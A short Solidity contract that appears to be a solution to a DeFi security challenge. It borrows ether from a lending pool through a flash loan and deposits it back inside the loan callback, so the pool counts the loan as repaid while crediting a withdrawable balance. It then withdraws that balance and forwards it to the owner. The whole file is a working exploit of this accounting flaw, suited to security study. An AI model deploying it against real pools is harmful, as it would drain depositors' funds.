// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideChannelLenderPool {
        function deposit() external payable;
        function flashLoan(uint256 amount) external;
        function withdraw() external;
}

contract FlashBorrower {
    address public immutable pool;
    address public immutable owner;

    constructor (address lendingPool, address deployer) {
        owner = deployer;
        pool = lendingPool;
    }

    function execute() external payable {        
        ISideChannelLenderPool(pool).deposit{value: msg.value}();
    }

    function startFlashLoan(uint256 amount) public {
        ISideChannelLenderPool(pool).flashLoan(amount);
    }

    function withdraw() public{        
        ISideChannelLenderPool(pool).withdraw();        
    }

    receive () external payable {
        payable(owner).transfer(address(this).balance);
    }
}